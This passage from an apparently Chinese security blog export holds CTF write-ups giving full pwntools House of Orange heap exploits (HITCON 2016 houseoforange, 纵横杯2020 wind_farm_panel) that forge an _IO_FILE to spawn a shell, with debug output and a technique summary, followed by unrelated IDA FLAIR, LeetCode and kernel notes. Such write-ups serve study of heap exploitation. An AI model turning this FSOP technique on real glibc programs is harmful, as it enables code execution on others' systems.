class="number">0xfa1</span>)</span><br><span class="line">edit(len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">'a'</span>)</span><br><span class="line">show()</span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  log.success(<span class="string">"0:"</span>+hex(local))</span><br><span class="line">  libc_base = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  log.success(<span class="string">"1:"</span>+hex(local))</span><br><span class="line">  libcbase = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)<span class="number">-0x39c161</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">  log.success(<span class="string">"2:"</span>+hex(local))</span><br><span class="line">  libc_base = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>) - <span class="number">0x3bba61</span></span><br><span class="line">log.success(<span class="string">"libc_base:"</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span></span><br><span class="line">edit(len(payload),payload)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">heapbase = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) - <span class="number">0xc0</span></span><br><span class="line">log.success(<span class="string">"heap_base:"</span>+hex(heapbase))</span><br><span class="line"></span><br><span class="line">_IO_list_all = libcbase + libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">system = libcbase + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">0x400</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+ p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_file = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += fake_file</span><br><span class="line">payload += p64(heapbase + <span class="number">0x5c8</span>)</span><br><span class="line">payload += p64(system) * <span class="number">8</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x800</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">  </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>1/2概率</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">@          House of Orange          @</span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line"> 1. Build the house                  </span><br><span class="line"> 2. See the house                    </span><br><span class="line"> 3. Upgrade the house                </span><br><span class="line"> 4. Give up                          </span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">Your choice : *** Error in &#96;.&#x2F;houseoforange_hitcon_2016&#39;: malloc(): memory corruption: 0x00007fdf7644b520 ***</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">@          House of Orange          @</span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line"> 1. Build the house                  </span><br><span class="line"> 2. See the house                    </span><br><span class="line"> 3. Upgrade the house                </span><br><span class="line"> 4. Give up                          </span><br><span class="line">+++++++++++++++++++++++++++++++++++++</span><br><span class="line">Your choice : *** Error in &#96;.&#x2F;houseoforange_hitcon_2016&#39;: malloc(): memory corruption: 0x00007f37d5976520 ***</span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &#39;ls\n&#39;</span><br><span class="line">[DEBUG] Received 0x6e bytes:</span><br><span class="line">    &#39;core\tgets\thouseoforange_hitcon_2016  magic.py   orange.py\n&#39;</span><br><span class="line">    &#39;exp.py\thoo.py\tlibc-2.23.so\t\t   magicheap  winter.py\n&#39;</span><br><span class="line">core    gets    houseoforange_hitcon_2016  magic.py   orange.py</span><br><span class="line">exp.py    hoo.py    libc-2.23.so           magicheap  winter.py</span><br></pre></td></tr></table></figure>
<h3 id="参考-amp-下载"><a href="#参考-amp-下载" class="headerlink" title="参考 &amp; 下载"></a>参考 &amp; 下载</h3><p><a href="houseoforange_hitcon_2016">附件</a></p>
<ul>
<li><a href="https://www.anquanke.com/post/id/218887#h3-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/218887#h3-4</a></li>
<li><a href="https://blog.joe1sn.top/2021/BUUCTF/#0x3-%E6%B3%84%E9%9C%B2libc%E5%92%8Cheap%E7%9A%84%E5%9C%B0%E5%9D%80" target="_blank" rel="noopener">https://blog.joe1sn.top/2021/BUUCTF/#0x3-%E6%B3%84%E9%9C%B2libc%E5%92%8Cheap%E7%9A%84%E5%9C%B0%E5%9D%80</a></li>
<li><a href="http://blog.eonew.cn/archives/1093#glibc-227" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1093#glibc-227</a></li>
<li><a href="https://www.xi4oyu.top/6a6ded9c/" target="_blank" rel="noopener">https://www.xi4oyu.top/6a6ded9c/</a></li>
<li><a href="https://roderickchan.github.io/2021/04/24/houseoforange-hitcon-2016/" target="_blank" rel="noopener">https://roderickchan.github.io/2021/04/24/houseoforange-hitcon-2016/</a></li>
<li><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44145820/article/details/105270036</a></li>
<li><a href="https://orangegzy.github.io/2020/08/18/houseoforange-hitcon-2016-FSOP/" target="_blank" rel="noopener">https://orangegzy.github.io/2020/08/18/houseoforange-hitcon-2016-FSOP/</a></li>
</ul>
<h2 id="纵横杯2020-wind-farm-panel"><a href="#纵横杯2020-wind-farm-panel" class="headerlink" title="纵横杯2020 - wind_farm_panel"></a>纵横杯2020 - wind_farm_panel</h2><blockquote>
<p>house of orange的经典题，没啥变化，，，有了上一个基础，很快能做出来</p>
</blockquote>
<h3 id="程序流程-1"><a href="#程序流程-1" class="headerlink" title="程序流程"></a>程序流程</h3><p><img src="/2021/05/13/13-41/image-20201229182916014.png" alt="image-20201229182916014"></p>
<p>根据菜单，只有添加、打印和修改功能，没有free功能</p>
<p><img src="/2021/05/13/13-41/image-20201229183505395.png" alt="image-20201229183505395"></p>
<p><img src="/2021/05/13/13-41/image-20201229183037804.png" alt="image-20201229183037804"></p>
<p>而且添加和修改的时候都有堆溢出，故应该用house of orange来解。</p>
<h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">file = <span class="string">"wind_farm_panel"</span></span><br><span class="line"></span><br><span class="line">local=<span class="number">1</span></span><br><span class="line"><span class="comment">#local libc</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">  p = process(<span class="string">"./"</span>+file)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug libc</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">1</span>:</span><br><span class="line">  p = process([<span class="string">"/usr/local/glibc-2.23/lib/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"/usr/local/glibc-2.23/lib/libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#remote</span></span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span>:</span><br><span class="line">  p = process([<span class="string">"/home/winter/hoo/ld-2.23.so"</span>, <span class="string">"./"</span>+file],</span><br><span class="line">            env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/home/winter/hoo/libc-2.23.so"</span>&#125;)</span><br><span class="line">  elf = ELF(<span class="string">"./"</span>+file)</span><br><span class="line">  libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(choice)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(str(choice))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"turned on(0 ~ 5):"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"wind turbine: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Your name:"</span>)</span><br><span class="line">    p.send(str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">" viewed: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"turbine:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Please input: "</span>)</span><br><span class="line">    p.send(str(content))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'winter'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x90</span></span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0xf61</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1000</span>,<span class="string">'winter'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x400</span>,<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)<span class="number">-0x39C161</span></span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x11</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">'a'</span>*<span class="number">0x10</span>)</span><br><span class="line">heapbase = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)<span class="number">-0x61</span></span><br><span class="line">log.success(<span class="string">"heap_base:"</span>+hex(heapbase))</span><br><span class="line"></span><br><span class="line">_IO_list_all = libc_base + libc.sym[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x400</span></span><br><span class="line">fake_file = <span class="string">'/bin/sh\x00'</span> + p64(<span class="number">0x60</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>) + p64(<span class="number">1</span>)</span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += fake_file</span><br><span class="line">payload += p64(heapbase + <span class="number">0x588</span>)</span><br><span class="line"><span class="comment">#0x555555f774b0 + 0xd8 - heap_base</span></span><br><span class="line">payload += p64(system) * <span class="number">8</span></span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"turned on(0 ~ 5):"</span>)</span><br><span class="line">p.sendline(str(<span class="number">3</span>))</span><br><span class="line">p.recvuntil(<span class="string">"wind turbine: "</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x90</span>))</span><br><span class="line">    </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x56 bytes:</span><br><span class="line">    &quot;*** Error in &#96;.&#x2F;wind_farm_panel&#39;: malloc(): memory corruption: 0x00007f49da1f5520 ***\n&quot;</span><br><span class="line">*** Error in &#96;.&#x2F;wind_farm_panel&#39;: malloc(): memory corruption: 0x00007f49da1f5520 ***</span><br><span class="line">$ ls</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &#39;ls\n&#39;</span><br><span class="line">[DEBUG] Received 0x38 bytes:</span><br><span class="line">    &#39;core  ld-2.23.so  libc-2.23.so\twind.py  wind_farm_panel\n&#39;</span><br><span class="line">core  ld-2.23.so  libc-2.23.so    wind.py  wind_farm_panel</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h3 id="参考-amp-下载-1"><a href="#参考-amp-下载-1" class="headerlink" title="参考 &amp; 下载"></a>参考 &amp; 下载</h3><div class="table-container">
<table>
<thead>
<tr>
<th>附件</th>
<th>libc</th>
<th>ld</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="wind_farm_panel">点击下载</a></td>
<td><a href="libc-2.23.so">点击下载</a></td>
<td><a href="ld-2.23.so">点击下载</a></td>
</tr>
</tbody>
</table>
</div>
<ol>
<li><a href="https://www.giantbranch.cn/2018/12/29/CTF%20PWN%E4%B9%8Bhouse%20of%20orange/" target="_blank" rel="noopener">https://www.giantbranch.cn/2018/12/29/CTF%20PWN%E4%B9%8Bhouse%20of%20orange/</a></li>
<li><a href="https://b0ldfrev.top/2018/11/06/House-of-orange/#FSOP" target="_blank" rel="noopener">https://b0ldfrev.top/2018/11/06/House-of-orange/#FSOP</a></li>
<li><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/28/orange/" target="_blank" rel="noopener">https://xuanxuanblingbling.github.io/ctf/pwn/2020/12/28/orange/</a></li>
</ol>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>house of orange的步骤：</p>
<ol>
<li><p>栈溢出，修改top chunk的大小。一般保留后三位就行。</p>
</li>
<li><p>top chunk放入了unsortbin</p>
</li>
<li><p>申请一个small bin or large bin（会从unsortbin中切）</p>
</li>
<li><p>泄漏libc（申请回来的第一行数据）</p>
</li>
<li><p>泄漏堆地址（申请回来的第二行数据）</p>
</li>
<li><p>unsortbin attack </p>
<ol>
<li><p>“/bin/sh\x00” + p64(0x61)  =&gt; binsh是作为fp的第一参数，0x61是因为_chains刚好在这儿,</p>
</li>
<li><p>fd随便，bk填<code>libc.symbols[&#39;_IO_list_all&#39;]-0x10</code></p>
</li>
<li><p>接着是_IO_write_base和IO_write_ptr &gt; fp，需要让fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base，故分别填0、1即可</p>
</li>
<li><p>因为vtable的偏移是0xd8，所以都填上0即可（mode需要为0）</p>
</li>
<li>在vtable上填上假的构造的即可，这里是system的函数地址</li>
<li>最后修改即可。</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>专题</category>
      </categories>
      <tags>
        <tag>house of orange</tag>
      </tags>
  </entry>
  <entry>
    <title>ida flair</title>
    <url>/2021/03/12/12-53/</url>
    <content><![CDATA[<h1 id="ida-flair"><a href="#ida-flair" class="headerlink" title="ida flair"></a>ida flair</h1><blockquote>
<p>功能：恢复<strong>静态编译</strong> <strong>去符号</strong> 得库函数名</p>
<p>以pwnable.tw得3×17题为例</p>
</blockquote>
<p>是静态的</p>
<p><img src="/2021/03/12/12-53/image-20210312123918829.png" alt="image-20210312123918829"></p>
<p>也去了符号表，，，</p>
<p>所以可以用ida flair这个功能</p>
<h3 id="1-下载sig"><a href="#1-下载sig" class="headerlink" title="1. 下载sig"></a>1. 下载sig</h3><p><a href="https://github.com/push0ebp/sig-database" target="_blank" rel="noopener">sig-database</a></p>
<h3 id="2-拷贝"><a href="#2-拷贝" class="headerlink" title="2. 拷贝"></a>2. 拷贝</h3><p>下载文件 =&gt;    libc6    =&gt;    16.04    =&gt;    amd64    =&gt;    选中所有的文件    =&gt;    拷贝到ida目录/sig/pc下面</p>
<h3 id="3-加载"><a href="#3-加载" class="headerlink" title="3.加载"></a>3.加载</h3><p>在打开文件的ida下选择：file    -&gt;    load file    -&gt;    filter signature file    =&gt;    ctrl+f 找到对应的文件即可</p>
<p><img src="/2021/03/12/12-53/image-20210312124712543.png" alt="image-20210312124712543"></p>
<h3 id="4-查看"><a href="#4-查看" class="headerlink" title="4.查看"></a>4.查看</h3><p>shift + f5即可查看应用的结果，，，可以看到第一个查到了56个函数，，，</p>
<p><img src="/2021/03/12/12-53/image-20210312125241686.png" alt="image-20210312125241686"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/u013043103/article/details/109389236?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=1328642.8119.16155163068355197&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control" target="_blank" rel="noopener">使用IDA flair恢复静态编译去符号的库函数名</a></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><blockquote>
<p>虽然这次效果不怎么样，，，，，该识别的main函数等都没有识别出来，，，但是成功了，，，，多加些可能效果更好，，，</p>
</blockquote>
]]></content>
      <categories>
        <category>ida</category>
      </categories>
      <tags>
        <tag>flair</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode刷题（入门）</title>
    <url>/2021/03/10/21-27/</url>
    <content><![CDATA[<blockquote>
<p>跟着bilibili视频：<a href="https://www.bilibili.com/video/BV1xa411A76q?p=6" target="_blank" rel="noopener">Leetcode力扣 1-300题视频讲解合集｜手画图解版+代码【持续更新ing】</a>来先简单学习</p>
<p>更新中。。。</p>
</blockquote>
<h2 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1 两数之和"></a>1 两数之和</h2><blockquote>
<p>两种方法：暴力法和哈希表</p>
</blockquote>
<h3 id="暴力法"><a href="#暴力法" class="headerlink" title="暴力法"></a>暴力法</h3><blockquote>
<p>直接用常数创建数组</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;i,j&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h3><h4 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map&lt;Integer,Integer&gt; hashtable = <span class="keyword">new</span> HashMap&lt;Integer,Integer&gt;();</span><br></pre></td></tr></table></figure>
<h4 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hashtable.put(nums[i],i);</span><br></pre></td></tr></table></figure>
<h4 id="包含某一个键"><a href="#包含某一个键" class="headerlink" title="包含某一个键"></a>包含某一个键</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hashtable.containsKey(target - nums[i])</span><br></pre></td></tr></table></figure>
<h4 id="得到值"><a href="#得到值" class="headerlink" title="得到值"></a>得到值</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">hashtable.containsKey(target - nums[i])</span><br></pre></td></tr></table></figure>
<h2 id="2-两数相加"><a href="#2-两数相加" class="headerlink" title="2 两数相加"></a>2 两数相加</h2><h3 id="迭代法"><a href="#迭代法" class="headerlink" title="迭代法"></a>迭代法</h3><blockquote>
<p>注意点：</p>
<ol>
<li>返回链表的指针不能动，，，要创建一个current指针来紧随当前运行的情况<code>cur = res</code></li>
<li>最后返回的是<code>res.next</code>，因为一开始的值是空。</li>
</ol>
</blockquote>
<h3 id="递归法"><a href="#递归法" class="headerlink" title="递归法"></a>递归法</h3><blockquote>
<p>稍微，，，，尤其是最后有点点难理解</p>
</blockquote>
<p>主要思路是让两个链表的一直加，如果有个链表没有了，就创建val为0的node。</p>
<p>结束条件：<code>l1.next != null || l2.next != null || next !=0</code></p>
<p>最后返回的是res</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(l1.next != <span class="keyword">null</span> || l2.next != <span class="keyword">null</span> || next !=<span class="number">0</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span>(l1.next!=<span class="keyword">null</span>) &#123;</span><br><span class="line">		l1 = l1.next;</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		l1 = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(l2.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">		l2 = l2.next;</span><br><span class="line">	&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">		l2 = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	l1.val += next;</span><br><span class="line">	res.next = addTwoNumbers(l1, l2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>还行吧，，，大概的意思就理解。。。。<del>哭哭</del></p>
<h2 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20 有效的括号"></a>20 有效的括号</h2><blockquote>
<p>思路：将字符串通过函数<code>toCharArray（）</code>变成数组，然后将左括号入栈，右边进行匹配，失败直接返回，成功继续，，，一直看最后的栈是否空即可。</p>
<p>注意：根据题目已知“”空串返回true，所以一开始可以直接判断字符串长度是否为0。</p>
</blockquote>
<h3 id="增强for循环"><a href="#增强for循环" class="headerlink" title="增强for循环"></a>增强for循环</h3><blockquote>
<p>从字符数组总依次取出字符</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">char</span> ch : s.toCharArray()) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="？：返回"><a href="#？：返回" class="headerlink" title="？：返回"></a>？：返回</h3><blockquote>
<p>感觉和很有意思</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> stack.isEmpty()?<span class="keyword">true</span>:<span class="keyword">false</span>;</span><br></pre></td></tr></table></figure>
<h2 id="21-合并两个有序链表"><a href="#21-合并两个有序链表" class="headerlink" title="21 合并两个有序链表"></a>21 合并两个有序链表</h2><blockquote>
<p>有了第二题的铺垫，，，，easy</p>
</blockquote>
<h3 id="迭代法-1"><a href="#迭代法-1" class="headerlink" title="迭代法"></a>迭代法</h3><p>直接链入剩余的链表</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(l1 == <span class="keyword">null</span>) &#123;</span><br><span class="line">	cur.next = l2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>赋值的两种方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1. 创建一个新的node</span></span><br><span class="line">cur.next = <span class="keyword">new</span> ListNode(l2.val);</span><br><span class="line"><span class="comment">//2.将l2赋值，只有节点，不是链表</span></span><br><span class="line">cur.next = l2;</span><br></pre></td></tr></table></figure>
<h3 id="递归法-1"><a href="#递归法-1" class="headerlink" title="递归法"></a>递归法</h3><blockquote>
<p>高级，需要好好理解。</p>
<p>递归首先要确认结束条件</p>
<p>接下来结果的链入interesting!</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//		if(l1 == null) &#123;</span></span><br><span class="line"><span class="comment">//			return l2;</span></span><br><span class="line"><span class="comment">//		&#125;</span></span><br><span class="line"><span class="comment">//		if(l2 == null) &#123;</span></span><br><span class="line"><span class="comment">//			return l1;</span></span><br><span class="line"><span class="comment">//		&#125;</span></span><br><span class="line">		<span class="keyword">if</span>(l1 == <span class="keyword">null</span> || l2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> l1 == <span class="keyword">null</span> ? l2 : l1;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(l1.val &lt;= l2.val) &#123;</span><br><span class="line">			l1.next = mergeTwoLists(l1.next, l2);</span><br><span class="line">			<span class="keyword">return</span> l1;</span><br><span class="line">		&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">			l2.next = mergeTwoLists(l1, l2.next);</span><br><span class="line">			<span class="keyword">return</span> l2;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
<h2 id="22-括号生成"><a href="#22-括号生成" class="headerlink" title="22 括号生成"></a>22 括号生成</h2><h3 id="搁置-暴力法"><a href="#搁置-暴力法" class="headerlink" title="[搁置]暴力法"></a>[搁置]暴力法</h3><blockquote>
<p>[搁置]的都稍后来做，，，先学算法吧。。。。</p>
</blockquote>
<h3 id="回溯法"><a href="#回溯法" class="headerlink" title="回溯法"></a>回溯法</h3><blockquote>
<p>emmm，这个是蓝桥杯里经常用的方法，，，，但是这里对有效括号的判断很有意思：</p>
<ol>
<li>如果左括号小于n，就可以继续增加左括号</li>
<li><strong>如果每时刻右括号的数量小于左括号的数量，就是有效的</strong></li>
<li>当满足上述条件并且括号数量对了的时候，就可以添加进来了。</li>
</ol>
</blockquote>
<h4 id="StringBuilder"><a href="#StringBuilder" class="headerlink" title="StringBuilder"></a>StringBuilder</h4><h5 id="创建-1"><a href="#创建-1" class="headerlink" title="创建"></a>创建</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> StringBuilder()</span><br></pre></td></tr></table></figure>
<h5 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">StringBuilder cur;</span><br></pre></td></tr></table></figure>
<h5 id="转String"><a href="#转String" class="headerlink" title="转String"></a>转String</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">cur.toString()</span><br></pre></td></tr></table></figure>
<h5 id="删除指定位置元素"><a href="#删除指定位置元素" class="headerlink" title="删除指定位置元素"></a>删除指定位置元素</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">cur.deleteCharAt(cur.length()-<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title>kernel study</title>
    <url>/2021/06/05/20-29/</url>
    <content><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><blockquote>
<p>这里只是简单记录了一些笔者认为的重点。</p>
</blockquote>
<h3 id="概念性"><a href="#概念性" class="headerlink" title="概念性"></a>概念性</h3><ol>
<li>cred =&gt; 进程权限结构体</li>
<li>smep =&gt; 执行</li>
<li>smap =&gt; 访问</li>
<li>MMAP_MIN_ADDR =&gt; 允许mmap映射的最低内存地址</li>
<li><p>LKMs</p>
<ol>
<li>相当于内核的可执行程序</li>
<li>不能单独运行，在运行时被链接到内核</li>
</ol>
</li>
<li>lsmod: 列出已经加载的模块</li>
<li>module_init/module_exit：在载入/卸载这个驱动时<strong>自动运行</strong></li>
<li><p>C99 </p>
<ol>
<li>C编程语言标准的过去版本，扩展了版本 C90</li>
<li>允许使用可变长度数组</li>
</ol>
</li>
<li>modules：内核扩展模块</li>
<li>bzImage: 压缩的kernel内存映像</li>
<li>vmlinux：未压缩的kernel内存映像</li>
<li>rootfs.cpio: 文件系统映像</li>
<li>alloc_chrdev_region：动态分配设备编号</li>
</ol>
<hr>
<h3 id="IRET"><a href="#IRET" class="headerlink" title="IRET"></a>IRET</h3><p><strong>1. 相同保护级别</strong></p>
<p>从堆栈弹出</p>
<ol>
<li>代码段选择子 =&gt; CS寄存器</li>
<li>指令指针 =&gt; IP寄存器</li>
<li>标志寄存器 =&gt; EFLAGS寄存器</li>
</ol>
<p><strong>不同的保护级别</strong></p>
<p>除了以上3点外，还有</p>
<ol>
<li>堆栈段选择子 =&gt; SS寄存器</li>
<li>堆栈指针 =&gt; SP寄存器</li>
</ol>
<p>返回到用户模式</p>
<blockquote>
<p>栈上保存了<code>trap frame</code>，用于恢复信息</p>
</blockquote>
